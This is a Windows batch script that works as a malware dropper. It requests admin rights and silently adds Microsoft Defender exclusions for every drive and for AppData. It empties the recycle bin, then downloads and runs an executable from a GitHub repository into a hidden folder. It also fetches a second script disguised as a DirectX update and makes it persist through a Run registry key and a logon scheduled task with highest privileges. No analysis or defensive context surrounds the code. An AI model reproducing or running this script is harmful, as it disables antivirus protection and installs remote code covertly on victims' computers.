@echo off
:: Run as admin check
net session >nul 2>&1
if %errorlevel% NEQ 0 (
    powershell -WindowStyle Hidden -Command "Start-Process '%~f0' -Verb runAs; exit"
    exit /b
)

:: Define folder paths (moved up here)
set "APPDATA_PATH=%USERPROFILE%\AppData"
set "ROAMING_PATH=%APPDATA_PATH%\Roaming"
set "TRACES_DIR=%ROAMING_PATH%\Traces"
set "SUBDIR=%ROAMING_PATH%\SubDir"
set "TARGET_FILE=%TRACES_DIR%\Client-built.exe"
set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"

:: Exclude all real drives
for %%L in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist %%L:\ (
        powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%%L:\'; exit"
    )
)

:: Exclude AppData
powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'; exit"

:: Kill System32.exe if running in SubDir
if exist "%SUBDIR%\System32.exe" (
    taskkill /F /IM System32.exe >nul 2>&1
)

:: Only delete the 'System32' folder inside %SUBDIR%
if exist "%SUBDIR%\System32" (
    rd /s /q "%SUBDIR%\System32"
)

if exist "%SUBDIR%\System32.exe" (
    attrib -h -s -r "%SUBDIR%\System32.exe" >nul 2>&1
    attrib +h +s "%SUBDIR%\System32.exe" >nul 2>&1
)


call :clean_folder "%TRACES_DIR%"

timeout /t 1 >nul

mkdir "%TRACES_DIR%" >nul 2>&1

attrib -h -s -r "%TRACES_DIR%" >nul 2>&1
attrib +h +s "%TRACES_DIR%" >nul 2>&1

if not exist "%TRACES_DIR%" (
    echo Failed to create Traces folder.
    pause
    exit /b 1
)

:: Empty recycle bin silently
powershell -WindowStyle Hidden -Command "$shell=New-Object -ComObject Shell.Application; $recycle=$shell.NameSpace(0xA); $items=$recycle.Items(); foreach ($item in $items) {Remove-Item $item.Path -Recurse -Force -ErrorAction SilentlyContinue}; exit" >nul 2>&1

:: Download and run main payload
powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DOWNLOAD_URL%', '%TARGET_FILE%'); exit"

timeout /t 2 >nul

if exist "%TARGET_FILE%" (
    start "" "%TARGET_FILE%"
) else (
    echo Failed to download main payload.
    exit /b 1
)

if exist "%SUBDIR%\System32.exe" (
    attrib +h +s "%SUBDIR%\System32.exe"
)

:: Prepare DirectXUpdate.bat in AppData\Microsoft
set "MICROSOFT_FOLDER=%APPDATA%\Microsoft"
set "DirectXUpdate_BAT_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/DirectXUpdate.bat"
set "DirectXUpdate_BAT_FILE=%MICROSOFT_FOLDER%\DirectXUpdate.bat"

if not exist "%MICROSOFT_FOLDER%" (
    mkdir "%MICROSOFT_FOLDER%"
)
attrib -h -s -r "%MICROSOFT_FOLDER%" >nul 2>&1
attrib +h +s "%MICROSOFT_FOLDER%" >nul 2>&1

powershell -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadFile('%DirectXUpdate_BAT_URL%', '%DirectXUpdate_BAT_FILE%'); exit"

if exist "%DirectXUpdate_BAT_FILE%" (
    attrib -h -s -r "%DirectXUpdate_BAT_FILE%" >nul 2>&1
    attrib +h +s "%DirectXUpdate_BAT_FILE%" >nul 2>&1
)

if not exist "%DirectXUpdate_BAT_FILE%" (
    echo Failed to download DirectXUpdate.bat file.
    exit /b 1
)

:: Remove Task Manager "disabled" block if it exists
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /v "DirectXUpdate" /f >nul 2>&1

:: Add to registry startup (Run)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "DirectXUpdate" /t REG_SZ /d "\"%DirectXUpdate_BAT_FILE%\"" /f >nul 2>&1

SCHTASKS /Create /TN "DirectXUpdateHidden" /TR "\"%DirectXUpdate_BAT_FILE%\"" /SC ONLOGON /RL HIGHEST /F >nul 2>&1

:clean_folder
if exist "%~1\" (
    attrib -h -s -r "%~1\*" /s /d >nul 2>&1
    rmdir /s /q "%~1" >nul 2>&1
)
exit /b

:: Made By MrAboudi
:: v3.1
